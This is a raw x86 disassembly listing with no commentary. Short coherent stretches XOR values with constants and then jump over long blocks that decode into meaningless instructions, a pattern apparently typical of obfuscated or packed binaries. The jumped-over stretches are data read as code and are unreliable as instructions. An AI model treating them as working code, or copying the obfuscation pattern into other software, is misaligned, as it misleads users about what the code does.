  40c363:	mov    ecx,DWORD PTR [ebp-0x14]
  40c366:	mov    edx,DWORD PTR [ebp-0x18]
  40c369:	mov    esi,DWORD PTR [ebp-0x14]
  40c36c:	shrd   eax,ecx,0x2
  40c370:	shl    edx,0x1e
  40c373:	mov    edx,DWORD PTR ds:0x422558
  40c379:	mov    edx,DWORD PTR [edx+0x1a8]
  40c37f:	shr    ecx,0x2
  40c382:	xor    esi,esi
  40c384:	mov    ecx,0x329e695d
  40c389:	xor    eax,ecx
  40c38b:	or     eax,esi
  40c38d:	mov    DWORD PTR [edx],eax
  40c38f:	mov    eax,DWORD PTR [ebp-0x18]
  40c392:	mov    edx,DWORD PTR [ebp-0x14]
  40c395:	shrd   eax,edx,0x2
  40c399:	shr    edx,0x2
  40c39c:	mov    edx,DWORD PTR [ebp-0x18]
  40c39f:	mov    esi,DWORD PTR [ebp-0x14]
  40c3a2:	xor    eax,ecx
  40c3a4:	xor    esi,esi
  40c3a6:	or     eax,esi
  40c3a8:	mov    ds:0x42276c,eax
  40c3ad:	mov    BYTE PTR [ebp-0x2],0x4f
  40c3b1:	mov    BYTE PTR [ebp-0x1],0xf9
  40c3b5:	movzx  eax,BYTE PTR [ebp-0x1]
  40c3b9:	shl    edx,0x1e
  40c3bc:	mov    dl,BYTE PTR [ebp-0x2]
  40c3bf:	jmp    0x40c7b5
  40c3c4:	(bad)  
  40c3c5:	xor    al,0x5b
  40c3c7:	mov    dl,0x5b
  40c3c9:	call   0x6af2:0x3fac243e
  40c3d0:	daa    
  40c3d1:	(bad)  
  40c3d2:	sbb    edi,DWORD PTR [esi+0xd]
  40c3d5:	std    
  40c3d6:	sbb    BYTE PTR [eax],bl
  40c3d8:	outs   dx,BYTE PTR ds:[esi]
  40c3d9:	adc    bl,BYTE PTR [eax]
  40c3db:	sbb    BYTE PTR [edi+0x53f724c2],al
  40c3e1:	shl    edi,cl
  40c3e3:	and    ebx,edi
  40c3e5:	sahf   
  40c3e6:	add    eax,0x5c430984
  40c3eb:	adc    edi,ebp
  40c3ed:	sahf   
  40c3ee:	out    dx,eax
  40c3ef:	je     0x40c407
  40c3f1:	iret   
  40c3f2:	in     al,0x75
  40c3f4:	outs   dx,DWORD PTR ds:[esi]
  40c3f5:	add    edi,ecx
  40c3f7:	mov    ah,0xed
  40c3f9:	adc    ah,0x71
  40c3fc:	ss pop ebp
  40c3fe:	stos   DWORD PTR es:[edi],eax
  40c3ff:	or     edx,DWORD PTR [esi]
  40c401:	bound  edi,QWORD PTR [esi+0x3f]
  40c404:	dec    esp
  40c405:	(bad)  
  40c407:	in     eax,0x42
  40c409:	mov    es,WORD PTR ds:0xcc30bda8
  40c40f:	push   ebx
  40c410:	xchg   ebx,eax
  40c411:	sub    edi,ebp
  40c413:	and    al,0x64
  40c415:	push   ss
  40c416:	jb     0x40c3f9
  40c418:	or     esi,DWORD PTR [eax]
  40c41a:	int    0xbb
  40c41c:	lahf   
  40c41d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c41e:	jo     0x40c42d
  40c420:	lods   al,BYTE PTR ds:[esi]
  40c421:	shr    DWORD PTR [ebx],0x94
  40c424:	mov    DWORD PTR [ecx-0x28],edi
  40c427:	mov    ebx,0x7916e27f
  40c42c:	scas   al,BYTE PTR es:[edi]
  40c42d:	gs jae 0x40c458
  40c430:	add    esp,0xa564ef49
  40c436:	mov    WORD PTR [esi+0x10b33d77],ss
  40c43c:	inc    ebp
  40c43d:	push   ecx
  40c43e:	imul   BYTE PTR [edi]
  40c440:	dec    edi
  40c441:	sbb    dl,bl
  40c443:	mov    esi,0xb1621358
  40c448:	test   DWORD PTR [edi],eax
  40c44a:	fild   WORD PTR [ecx]
  40c44c:	dec    esi
  40c44d:	dec    ebx
  40c44e:	cmp    eax,0xae9a168a
  40c453:	mov    ds:0xa36b9dc0,al
  40c458:	jb     0x40c425
  40c45a:	sti    
  40c45b:	fdiv   DWORD PTR [ebx]
  40c45d:	imul   ecx,DWORD PTR [edi],0x16
  40c460:	call   0x32da:0xb341c9f5
  40c467:	stc    
  40c468:	sbb    DWORD PTR [esi],ecx
  40c46a:	not    BYTE PTR [edi]
  40c46c:	add    ebx,DWORD PTR [edi]
  40c46e:	adc    bl,BYTE PTR [edx+0x3a]
  40c471:	popf   
  40c472:	(bad)  
  40c473:	loope  0x40c4be
  40c475:	or     DWORD PTR [ebx+0xc],ebx
  40c478:	cmp    eax,0x1e092c26
  40c47d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c47e:	in     eax,0x95
  40c480:	jg     0x40c419
  40c482:	push   0xdb2da6bc
  40c487:	loope  0x40c469
  40c489:	mov    WORD PTR [ebx+0x13],ss
  40c48c:	gs pop ds
  40c48e:	cli    
  40c48f:	ins    BYTE PTR es:[edi],dx
  40c490:	cmp    al,0x23
  40c492:	je     0x40c4ab
  40c494:	mov    ecx,0xde96e965
  40c499:	imul   ebx,DWORD PTR [ebx-0x4ca3bff8],0xffffffca
  40c4a0:	sbb    eax,0x7909c21d
  40c4a5:	hlt    
  40c4a6:	jnp    0x40c4e4
  40c4a8:	popa   
  40c4a9:	outs   dx,DWORD PTR ds:[esi]
  40c4aa:	mov    cl,0x5e
  40c4ac:	cmovno ecx,edx
  40c4af:	push   edi
  40c4b0:	shl    dh,cl
  40c4b2:	mov    ah,BYTE PTR [ebx+0x67]
  40c4b5:	push   edx
  40c4b6:	mov    edi,0xb21617f2
  40c4bb:	push   ds
  40c4bc:	unpckhps xmm4,XMMWORD PTR ds:0x6bca13b1
  40c4c3:	sti    
  40c4c4:	and    bl,bl
  40c4c6:	jno    0x40c4d3
  40c4c8:	cmp    DWORD PTR [edx-0x2d],ebx
  40c4cb:	rcr    DWORD PTR [ecx+0x6d],1
  40c4ce:	(bad)  
  40c4cf:	and    ebp,DWORD PTR [edx-0x58]
  40c4d2:	xchg   edi,eax
  40c4d3:	dec    esp
  40c4d4:	dec    edx
  40c4d5:	popf   
  40c4d6:	pop    edi
  40c4d7:	sub    dl,BYTE PTR [esi+ecx*2+0x109a1ece]
  40c4de:	xor    DWORD PTR [edi],esp
  40c4e0:	mul    BYTE PTR [ecx-0x2bf15b67]
  40c4e6:	xchg   ebx,eax
  40c4e7:	pop    ss
  40c4e8:	push   ebx
  40c4e9:	xor    DWORD PTR [esi],eax
  40c4eb:	cdq    
  40c4ec:	mov    ds:0xf0ca057,al
  40c4f1:	push   esi
  40c4f2:	mov    esi,0xf273ef9a
  40c4f7:	cmp    dl,BYTE PTR ds:0x3ab142ff
  40c4fd:	aam    0xd2
  40c4ff:	out    dx,al
  40c500:	mov    al,ds:0xd96d78a1
  40c505:	dec    eax
  40c506:	pop    es
  40c507:	or     al,0x19
  40c509:	scas   al,BYTE PTR es:[edi]
  40c50a:	pop    ecx
  40c50b:	lahf   
  40c50c:	mov    edi,0xc9e5c049
  40c511:	fld    TBYTE PTR [edi]
  40c513:	gs mov esi,0xc44fc18
  40c519:	jae    0x40c56c
  40c51b:	add    DWORD PTR [ebx],eax
  40c51d:	jnp    0x40c59b
  40c51f:	xor    eax,0xc3e2fef4
  40c524:	sti    
  40c525:	jnp    0x40c599
  40c527:	stos   BYTE PTR es:[edi],al
  40c528:	lods   eax,DWORD PTR ds:[esi]
  40c529:	cdq    
  40c52a:	dec    eax
  40c52b:	pop    ebx
  40c52c:	das    
  40c52d:	pop    esi
  40c52e:	or     ecx,DWORD PTR [esi-0xc29825b]
  40c534:	sbb    BYTE PTR [edx-0x62],bh
  40c537:	jge    0x40c4d3
  40c539:	bound  ecx,QWORD PTR [esi]
  40c53b:	xor    BYTE PTR [edi+0x198cd122],0xe2
  40c542:	pusha  
  40c543:	(bad)  
  40c544:	adc    al,0x61
  40c546:	fsubr  DWORD PTR [esi+ebx*1]
  40c549:	js     0x40c4f4
  40c54b:	push   ds
  40c54c:	(bad)  
  40c54d:	ins    BYTE PTR es:[edi],dx
  40c54e:	sub    ah,BYTE PTR [ecx-0x1e]
  40c551:	pop    edx
  40c552:	jns    0x40c5c8
  40c554:	cwde   
  40c555:	cmp    DWORD PTR [esi+0x7d],ebx
  40c558:	faddp  st(5),st
  40c55a:	not    DWORD PTR [esi-0x4ef00f65]
  40c560:	sub    bh,BYTE PTR [edx+0x3e]
  40c563:	adc    ch,ch
  40c565:	aas    
  40c566:	sti    
  40c567:	dec    edx
  40c568:	pop    ebx
  40c569:	addr16 (bad) 
  40c56b:	xchg   ebp,eax
  40c56c:	loope  0x40c4ef
  40c56e:	in     al,dx
  40c56f:	pop    ebx
  40c570:	out    dx,eax
  40c571:	jns    0x40c55b
  40c573:	iret   
  40c574:	push   ecx
  40c575:	xchg   esi,eax
  40c576:	push   ecx
  40c577:	loope  0x40c5c8
  40c579:	dec    edi
  40c57a:	retf   
  40c57b:	mov    bh,0xf7
  40c57d:	ret    
  40c57e:	mov    ds:0x2c6f1a9b,eax
  40c583:	xor    eax,0xe54dd29b
  40c588:	mov    dl,0x89
  40c58a:	pop    ecx
  40c58b:	xchg   DWORD PTR es:[esi],esp
  40c58e:	jle    0x40c51a
  40c590:	fdivr  DWORD PTR [ebp+0x6adb5874]
  40c596:	mov    dh,0x30
  40c598:	inc    eax
  40c599:	jo     0x40c542
  40c59b:	retf   0x313b
  40c59e:	call   0xa3ee84b9
  40c5a3:	sub    eax,0x26ec8601
  40c5a8:	mov    ds:0xe7fe178e,eax
  40c5ad:	fwait
  40c5ae:	sbb    ecx,DWORD PTR [esi]
  40c5b0:	xchg   esp,eax
  40c5b1:	jne    0x40c613
  40c5b3:	mov    BYTE PTR [edi],0xc3
  40c5b6:	pushf  
  40c5b7:	jmp    0xfe40f08d
  40c5bc:	aaa    
  40c5bd:	inc    esi
  40c5be:	sti    
  40c5bf:	adc    eax,0x37b13214
  40c5c4:	loope  0x40c5b0
  40c5c6:	xor    eax,0x58533284
  40c5cb:	mov    DWORD PTR gs:[esi+edx*8],eax
  40c5cf:	adc    BYTE PTR [ebx-0x62],al
  40c5d2:	scas   eax,DWORD PTR es:[edi]
  40c5d3:	xor    ah,dh
  40c5d5:	call   DWORD PTR [ebp+0x41d7df4b]
  40c5db:	fidiv  DWORD PTR [ecx]
  40c5dd:	loop   0x40c595
  40c5df:	mov    ebp,0x41646b9b
  40c5e4:	mov    dh,0x42
  40c5e6:	outs   dx,DWORD PTR ds:[esi]
  40c5e8:	add    ecx,DWORD PTR [ebp+0x6f]
  40c5eb:	add    al,0x6c
  40c5ed:	lods   al,BYTE PTR ds:[esi]
  40c5ee:	in     al,dx
  40c5ef:	mov    esp,0xe5215a42
  40c5f4:	addr16 or al,0x67
  40c5f7:	retf   0xd6b9
  40c5fa:	sbb    BYTE PTR [edx+0x2b442238],ch
  40c600:	add    al,0xc5
  40c602:	retf   
  40c603:	cmp    ebx,edx
  40c605:	or     al,0xc1
  40c607:	(bad)  
  40c608:	fistp  DWORD PTR [esi-0x91e816]
  40c60e:	sahf   
  40c60f:	jno    0x40c655
  40c611:	repz (bad) 
  40c613:	aad    0x7f
  40c615:	popa   
  40c616:	jne    0x40c63c
  40c618:	addr16 push ecx
  40c61a:	inc    esi
  40c61b:	adc    dh,al
  40c61d:	std    
  40c61e:	test   dh,al
  40c620:	jo     0x40c5a2
  40c622:	mov    dh,0x9b
  40c624:	aad    0x79
  40c626:	jno    0x40c654
  40c628:	sub    eax,0x495c8c6f
  40c62d:	inc    edi
  40c62e:	sar    BYTE PTR ds:[ebx],1
  40c631:	mov    al,0x15
  40c633:	push   es
  40c634:	or     eax,0x3ee7d0f1
  40c639:	ja     0x40c66c
  40c63b:	loope  0x40c6b3
  40c63d:	out    0x70,al
  40c63f:	je     0x40c65a
  40c641:	mov    esp,0xe7988028
  40c646:	push   eax
  40c647:	jl     0x40c5f4
  40c649:	xchg   DWORD PTR [esi+eax*8+0x38],edi
  40c64d:	ret    
  40c64e:	mov    ds:0x76ae4b96,al
  40c653:	repnz dec esp
  40c655:	adc    ebp,DWORD PTR [ecx+edi*2+0x46bee2ce]
  40c65c:	pmulhuw mm6,QWORD PTR [ecx]
  40c65f:	popf   
  40c660:	mov    edx,0x6d8978d7
  40c665:	jo     0x40c665
  40c667:	jne    0x40c6de
  40c669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c66a:	cmp    esp,DWORD PTR [eax]
  40c66c:	fdiv   QWORD PTR ds:0xe046a8c0
  40c672:	data16 jl 0x40c692
  40c675:	data16 mov ah,0x31
  40c678:	cli    
  40c679:	jg     0x40c686
  40c67b:	mov    ah,0x9f
  40c67d:	loopne 0x40c630
  40c67f:	pop    esp
  40c680:	(bad)  
  40c681:	jbe    0x40c690
  40c683:	in     eax,dx
  40c684:	cdq    
  40c685:	pop    ebp
  40c686:	pop    ss
  40c687:	popa   
  40c688:	out    0x1e,al
  40c68a:	in     al,dx
  40c68b:	(bad)  
  40c68c:	xor    eax,0xa8e80e7a
  40c691:	mov    ebx,esi
  40c693:	fimul  WORD PTR [esi]
  40c695:	rol    DWORD PTR [esi-0x12],0x2f
  40c699:	cmp    eax,0x28b5278e
  40c69e:	xor    eax,0xf3a0971a
  40c6a3:	out    0xf8,al
  40c6a5:	sbb    edi,DWORD PTR [eax+0x3e]
  40c6a8:	sub    bl,BYTE PTR [edx+0x31993f2d]
  40c6ae:	and    BYTE PTR [edi],0xc3
  40c6b1:	cmp    ah,bl
  40c6b3:	and    ch,BYTE PTR [eax]
  40c6b5:	rcr    BYTE PTR [edx-0x3e],cl
  40c6b8:	test   BYTE PTR [eax+0x53adf967],ah
  40c6be:	(bad)  
  40c6c0:	pop    edx
  40c6c1:	push   esp
  40c6c2:	cld    
  40c6c3:	les    ecx,FWORD PTR [ecx-0x2a]
  40c6c6:	jbe    0x40c6f7
  40c6c8:	mov    edx,0x34404bad
  40c6cd:	out    0x2e,al
  40c6cf:	push   esp
  40c6d0:	test   BYTE PTR [edi-0x7bec455e],bh
  40c6d6:	and    eax,0x977a72b7
  40c6db:	mov    ebx,0xdb87feea
  40c6e0:	stos   BYTE PTR es:[edi],al
  40c6e1:	enter  0x8208,0xa9
  40c6e5:	adc    al,0x87
  40c6e7:	mov    WORD PTR [ecx-0x50320703],?
  40c6ed:	sbb    al,BYTE PTR [esi]
  40c6ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6f0:	add    cl,BYTE PTR [esi]
  40c6f2:	sbb    ah,bl
  40c6f4:	repz pop ss
  40c6f6:	clc    
  40c6f7:	sti    
  40c6f8:	aam    0x87
  40c6fa:	mov    esp,0x64057fd
  40c6ff:	call   DWORD PTR [edx-0x69]
  40c702:	cdq    
  40c703:	mov    ds:0xf4ee588d,al
  40c708:	stos   DWORD PTR es:[edi],eax
  40c709:	mul    BYTE PTR [ebp-0x61]
  40c70c:	clc    
  40c70d:	push   edi
  40c70e:	sub    al,0xab
  40c710:	and    DWORD PTR [edi],0xe501b3b
  40c716:	push   ss
  40c717:	push   0x70761707
  40c71c:	stos   BYTE PTR es:[edi],al
  40c71d:	xchg   ebp,eax
  40c71e:	lods   al,BYTE PTR ds:[esi]
  40c71f:	sar    BYTE PTR [edi],cl
  40c721:	push   edi
  40c722:	push   esi
  40c723:	or     DWORD PTR [eax+0x7a823d4e],ebx
  40c729:	call   0x64bf:0x1fff5f30
  40c730:	mov    ss,ebp
  40c732:	daa    
  40c733:	stc    
  40c734:	gs push esi
  40c736:	(bad)  
  40c737:	test   DWORD PTR [edx+edx*1-0x2c],0xafa73b88
  40c73f:	pop    ds
  40c740:	mov    eax,ds:0x5c7ee395
  40c745:	pop    ecx
  40c746:	or     DWORD PTR [edx-0x3b776833],0xffffffc6
  40c74d:	repnz push edx
  40c74f:	sysexit 
  40c751:	sbb    al,0x59
  40c753:	inc    edi
  40c754:	popa   
  40c755:	lods   eax,DWORD PTR ds:[esi]
  40c756:	sti    
  40c757:	mov    ebx,ecx
  40c759:	arpl   dx,bx
  40c75b:	or     DWORD PTR ds:0xa5663f82,edi
  40c761:	arpl   WORD PTR [edi-0x18f7534b],di
  40c767:	(bad)  
  40c768:	pop    esi
  40c769:	iret   
  40c76a:	xchg   ebx,eax
  40c76b:	into   
  40c76c:	(bad)  
  40c76e:	out    dx,eax
  40c76f:	ret    0x9614
  40c772:	push   0x48a40d61
  40c777:	jl     0x40c76a
  40c779:	jbe    0x40c71d
  40c77b:	aam    0x13
  40c77d:	std    
  40c77e:	dec    edx
  40c77f:	jl     0x40c737
  40c781:	stos   DWORD PTR es:[edi],eax
  40c782:	(bad)  
  40c783:	test   eax,0x32b3b0de
  40c788:	enter  0x45e3,0x7
  40c78c:	jg     0x40c7dc
  40c78e:	jne    0x40c762
  40c790:	inc    ebp
  40c791:	pop    edi
  40c792:	cmp    al,0xd4
  40c794:	in     eax,dx
  40c795:	jmp    0x3930:0x2e1927f1
  40c79c:	mov    ds:0x1a89018e,eax
  40c7a1:	pop    ebx
  40c7a2:	dec    eax
  40c7a3:	cdq    
  40c7a4:	pop    ebp
  40c7a5:	popa   
  40c7a6:	imul   ecx,DWORD PTR ds:0xd770abde,0xffffff9e
  40c7ad:	mov    ch,0x99
  40c7af:	xlat   BYTE PTR ds:[ebx]
  40c7b0:	lock sub al,0xf3
  40c7b3:	sti    
  40c7b4:	mov    eax,0xc2024234
  40c7b9:	push   0x6
  40c7bb:	add    eax,0xfa
  40c7c0:	mov    BYTE PTR [ebp-0x4],al
  40c7c3:	mov    BYTE PTR [ebp-0x3],0x67
  40c7c7:	pop    eax
  40c7c8:	mov    BYTE PTR [ebp-0x1],al
  40c7cb:	mov    BYTE PTR [ebp-0x2],0x3
  40c7cf:	mov    dl,BYTE PTR [ebp-0x2]
  40c7d2:	movzx  esi,dl
  40c7d5:	cdq    
  40c7d6:	idiv   esi
  40c7d8:	mov    dl,BYTE PTR [ebp-0x1]
  40c7db:	add    al,dl
  40c7dd:	mov    dl,BYTE PTR [ebp-0x3]
  40c7e0:	or     al,dl
  40c7e2:	mov    dl,BYTE PTR [ebp-0x4]
  40c7e5:	add    al,0x3a
  40c7e7:	cmp    dl,al
  40c7e9:	jmp    0x40cbdf
  40c7ee:	xchg   esi,eax
  40c7ef:	and    al,dl
  40c7f1:	cmc    
  40c7f2:	mov    ds:0xdc222674,al
  40c7f7:	mov    cl,BYTE PTR [edi-0x5a67d990]
  40c7fd:	mov    esp,0x1818f563
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	adc    bl,BYTE PTR [eax]
  40c805:	sbb    BYTE PTR [ecx+0x17e13ede],cl
  40c80b:	ins    BYTE PTR es:[edi],dx
  40c80c:	es or  esi,0x2760ca63
  40c813:	ins    DWORD PTR es:[edi],dx
  40c814:	xchg   ecx,eax
  40c815:	mov    ch,BYTE PTR [edx]
  40c817:	jle    0x40c79a
  40c819:	jmp    0xc7b3:0xd7627539
  40c820:	mov    edx,0xe3fbd99d
  40c825:	xor    BYTE PTR [edi+0xcc62545],dh
  40c82b:	jle    0x40c7ba
  40c82d:	lds    esi,FWORD PTR ss:[edi+0x3d091fe7]
  40c834:	adc    al,0xb5
  40c836:	pop    esi
  40c837:	mov    esi,DWORD PTR [esi+0x2e]
  40c83a:	jecxz  0x40c7f8
  40c83c:	loopne 0x40c82e
  40c83e:	inc    BYTE PTR [edx-0x3d791a3a]
  40c844:	addr16 push es
  40c846:	imul   ecx,DWORD PTR [ecx-0x43],0x27f06ad3
  40c84d:	retf   0x152b
  40c850:	sub    cl,al
  40c852:	lods   al,BYTE PTR ds:[esi]
  40c853:	sub    BYTE PTR [ecx],bl
  40c855:	stos   BYTE PTR es:[edi],al
  40c856:	push   esi
  40c857:	bnd jne 0x40c865
  40c85a:	push   eax
  40c85b:	add    eax,0x111239f5
  40c860:	dec    esp
  40c861:	pop    ebp
  40c862:	sbb    eax,0xf824f60c
  40c867:	inc    eax
  40c868:	cmp    al,0x2
  40c86a:	cmp    eax,0xd8b29cf0
  40c86f:	(bad)  
  40c870:	call   0x522b7bbb
  40c875:	xlat   BYTE PTR ds:[ebx]
  40c876:	gs retf 
  40c878:	popa   
  40c879:	mov    cl,0x38
  40c87b:	fisttp QWORD PTR [eax+edi*2+0x29580b9a]
  40c882:	dec    ebx
  40c883:	call   0x16c4:0xd1856e69
  40c88a:	rcl    eax,cl
  40c88c:	push   esi
  40c88d:	lahf   
  40c88e:	(bad)  
  40c88f:	ds stos BYTE PTR es:[edi],al
  40c891:	mov    bl,0x69
  40c893:	pushf  
  40c894:	fsubr  DWORD PTR [edi-0x1e6141e5]
  40c89a:	xchg   DWORD PTR [edi-0x17444aec],ecx
  40c8a0:	cmp    esi,DWORD PTR [ecx-0x69]
  40c8a3:	pop    eax
  40c8a4:	cmp    al,0x64
  40c8a6:	in     eax,0xdb
  40c8a8:	xchg   edi,eax
  40c8a9:	sub    eax,DWORD PTR [ebx-0x6d]
  40c8ac:	repnz pop eax
  40c8ae:	shl    ah,1
  40c8b0:	inc    edx
  40c8b1:	dec    edi
  40c8b2:	arpl   WORD PTR [esi+edx*8+0x1c],dx
  40c8b6:	mov    es,WORD PTR [edi-0x52]
  40c8b9:	jns    0x40c917
  40c8bb:	into   
  40c8bc:	push   0x4a704ae4
  40c8c1:	jmp    0xcb41d601
  40c8c6:	or     cl,BYTE PTR [ecx-0xc]
  40c8c9:	pop    esi
  40c8ca:	sub    ebx,edi
  40c8cc:	inc    ecx
  40c8cd:	icebp  
  40c8ce:	push   esp
  40c8cf:	lds    ecx,FWORD PTR [ebx]
  40c8d1:	and    edx,DWORD PTR [esi-0x5b]
  40c8d4:	jmp    0x4744:0xce902e10
  40c8db:	jl     0x40c87b
  40c8dd:	es ins BYTE PTR es:[edi],dx
  40c8df:	add    eax,0x34bdd0c4
  40c8e4:	pop    eax
  40c8e5:	sub    DWORD PTR [ecx-0x1c],edx
  40c8e8:	push   ecx
  40c8e9:	add    eax,ebp
  40c8eb:	cld    
  40c8ec:	into   
  40c8ed:	dec    esi
  40c8ee:	aaa    
  40c8ef:	stc    
  40c8f0:	call   0x2dd3d61
  40c8f5:	add    dh,BYTE PTR [ebp+0x223d7a6]
  40c8fb:	xor    ah,BYTE PTR [edi]
  40c8fd:	dec    ebx
  40c8fe:	sub    DWORD PTR [esi],edx
  40c900:	stos   BYTE PTR es:[edi],al
  40c901:	loopne 0x40c8cd
  40c903:	mov    bl,0x19
  40c905:	xchg   ecx,eax
  40c906:	sahf   
  40c907:	iret   
  40c908:	push   es
  40c909:	ins    BYTE PTR es:[edi],dx
  40c90a:	cmp    dl,BYTE PTR [ebx-0x38ccf9ea]
  40c910:	mov    eax,0xa7c477fc
  40c915:	and    eax,ebx
  40c917:	popf   
  40c918:	xor    BYTE PTR [esi+0x5ebe17d4],0x30
  40c91f:	fsubr  st,st(0)
  40c921:	hlt    
  40c922:	inc    ecx
  40c923:	cs gs ror edx,cl
  40c927:	dec    esi
  40c928:	xchg   DWORD PTR [eax-0x4],edx
  40c92b:	jno    0x40c976
  40c92d:	mov    ebp,0xffab75d3
  40c932:	jbe    0x40c94a
  40c934:	xor    DWORD PTR [ebp-0xdb6fa52],0xffffff9e
  40c93b:	(bad)
  40c93f:	or     DWORD PTR [ecx-0x62b7aafc],edx
  40c945:	mov    esp,0x8acec9a7
  40c94a:	dec    edx
  40c94b:	bound  edi,QWORD PTR [eax+0x109da8a5]
  40c951:	ds int3 
  40c953:	in     eax,dx
  40c954:	ds adc eax,0xe450a4b5
  40c95a:	(bad)  
  40c95b:	dec    esp
  40c95c:	push   esp
  40c95d:	sbb    al,0x70
  40c95f:	cmp    BYTE PTR [ebx-0x4],ah
  40c962:	(bad)  
  40c963:	cld    
  40c964:	pop    esi
  40c965:	iret   
  40c966:	stc    
  40c967:	mov    al,BYTE PTR [ecx]
  40c969:	shl    BYTE PTR [ebx+0xb],cl
  40c96c:	adc    eax,DWORD PTR [eax]
  40c96e:	push   ebp
  40c96f:	hlt    
  40c970:	or     DWORD PTR [edi],esp
  40c972:	inc    esi
  40c973:	js     0x40c9bc
  40c975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c976:	dec    eax
  40c977:	xor    DWORD PTR [ecx],esp
  40c979:	loopne 0x40c986
  40c97b:	outs   dx,BYTE PTR ds:[esi]
  40c97c:	pop    ebp
  40c97d:	aam    0x93
  40c97f:	sbb    BYTE PTR [esi],0x8
  40c982:	mov    al,0x69
  40c984:	mov    esp,?
  40c986:	dec    edi
  40c987:	int3   
  40c988:	adc    dl,dh
  40c98a:	repnz mov ebp,ebp
  40c98d:	test   al,0x3
  40c98f:	stc    
  40c990:	rcl    DWORD PTR [ecx+0x7230270e],1
  40c996:	jb     0x40c9ba
  40c998:	mov    eax,0xff6a4db6
  40c99d:	(bad)
  40c9a1:	loope  0x40c99d
  40c9a3:	repnz pop ds
  40c9a5:	iret   
  40c9a6:	mov    cl,0x6b
  40c9a8:	xor    al,0xdf
  40c9aa:	push   ecx
  40c9ab:	fnstsw WORD PTR [ebp+0x4d]
  40c9ae:	and    esi,edx
  40c9b0:	inc    BYTE PTR [eax-0x1b]
  40c9b3:	sbb    dl,BYTE PTR [esi+0x5b]
  40c9b6:	xchg   ecx,eax
  40c9b7:	std    
  40c9b8:	and    al,0xf7
  40c9ba:	fnop   
  40c9bc:	imul   esp,DWORD PTR [edx+ebp*4+0x62c5baba],0xffffff97
  40c9c4:	pop    esp
  40c9c5:	xchg   ebp,eax
  40c9c6:	mov    bh,BYTE PTR [edx]
  40c9c8:	(bad)  
  40c9c9:	sbb    eax,0xff61aba9
  40c9ce:	pop    esp
  40c9cf:	call   0x7156502e
  40c9d4:	mov    edx,DWORD PTR [eax+0x1f]
  40c9d7:	mov    eax,ds:0xbc347179
  40c9dc:	out    dx,al
  40c9dd:	call   0xdcb7:0x50eeae18
  40c9e4:	mov    dl,0xd5
  40c9e6:	popa   
  40c9e7:	fstp   TBYTE PTR [edi]
  40c9e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9ea:	hlt    
  40c9eb:	xor    edi,eax
  40c9ed:	pop    esi
  40c9ee:	cdq    
  40c9ef:	pop    es
  40c9f0:	sub    al,0xfb
  40c9f2:	in     al,0x9a
  40c9f4:	jnp    0x40ca1f
  40c9f6:	dec    esi
  40c9f7:	fwait
  40c9f8:	inc    esi
  40c9f9:	leave  
  40c9fa:	adc    esi,DWORD PTR [edi]
  40c9fc:	xor    ebp,esp
  40c9fe:	mov    edx,0xefb4190e
  40ca03:	scas   al,BYTE PTR es:[edi]
  40ca04:	scas   al,BYTE PTR es:[edi]
  40ca05:	push   ss
  40ca06:	inc    esi
  40ca07:	add    cl,dl
  40ca09:	nop
  40ca0a:	and    BYTE PTR [ebp+esi*1+0x69],ch
  40ca0e:	cmp    DWORD PTR [edi+0x2a],eax
  40ca11:	out    0xf1,al
  40ca13:	push   ecx
  40ca14:	inc    BYTE PTR [ebp+0x3c37addf]
  40ca1a:	scas   eax,DWORD PTR es:[edi]
  40ca1b:	mov    bl,BYTE PTR [esi]
  40ca1d:	lods   eax,DWORD PTR ds:[esi]
  40ca1e:	fadd   DWORD PTR [ebp-0x6c]
  40ca21:	(bad)  
  40ca22:	out    0x1b,al
  40ca24:	int3   
  40ca25:	cmp    DWORD PTR [esi],edi
  40ca27:	pop    es
  40ca28:	mov    eax,ds:0xbc0dcc53
  40ca2d:	pop    ss
  40ca2e:	jmp    0x59f:0x1ebe6f38
  40ca35:	add    al,BYTE PTR [eax]
  40ca37:	fnstsw WORD PTR gs:0x2859c506
  40ca3e:	sar    ebx,cl
  40ca40:	(bad)  
  40ca44:	adc    BYTE PTR [edx+0x13],bh
  40ca47:	dec    edx
  40ca48:	push   ss
  40ca49:	out    0xf9,eax
  40ca4b:	sbb    DWORD PTR [edi],esp
  40ca4d:	sti    
  40ca4e:	mov    cl,0x59
  40ca50:	mov    ds:0xb8104682,al
  40ca55:	xchg   edi,eax
  40ca56:	out    0x6d,al
  40ca58:	shr    BYTE PTR [ebx],1
  40ca5a:	inc    eax
  40ca5b:	or     ebp,DWORD PTR [esi+0x6e]
  40ca5e:	inc    eax
  40ca5f:	scas   al,BYTE PTR es:[edi]
  40ca60:	inc    esp
  40ca61:	push   ss
  40ca62:	jmp    DWORD PTR [ecx-0xe]
  40ca65:	push   esi
  40ca66:	jg     0x40c9f2
  40ca68:	add    BYTE PTR ds:0x8c16c5a2,al
  40ca6e:	jns    0x40cacf
  40ca70:	pushf  
  40ca71:	sub    DWORD PTR [ebp-0x51],edi
  40ca74:	clc    
  40ca75:	push   cs
  40ca76:	sbb    eax,0x80f0c0cc
  40ca7b:	(bad)  
  40ca7c:	adc    al,0x18
  40ca7e:	daa    
  40ca7f:	sar    BYTE PTR [esp+ecx*4],0x9b
  40ca83:	imul   esi,esi,0xfffffff8
  40ca86:	adc    DWORD PTR [eax],ebx
  40ca88:	frstor [ecx-0x22]
  40ca8b:	xchg   ebp,ebp
  40ca8d:	sbb    bh,BYTE PTR [edx-0x76]
  40ca90:	(bad)  [edx+0x76f91c8c]
  40ca96:	push   0xffffffbb
  40ca98:	stos   DWORD PTR es:[edi],eax
  40ca99:	cmp    eax,DWORD PTR [esp+ebp*1]
  40ca9c:	std    
  40ca9d:	jne    0x40ca98
  40ca9f:	or     BYTE PTR [ecx-0x736494c2],dh
  40caa5:	and    eax,DWORD PTR [esi+0x672af37c]
  40caab:	shl    al,1
  40caad:	mov    esi,0xe74b8f17
  40cab2:	call   0x4af3:0x110409ea
  40cab9:	inc    eax
  40caba:	iret   
  40cabb:	pop    edx
  40cabc:	retf   
  40cabd:	fwait
  40cabe:	push   ebx
  40cabf:	mov    edx,0x24f85ca4
  40cac4:	add    al,0x81
  40cac6:	add    eax,0xa02b4795
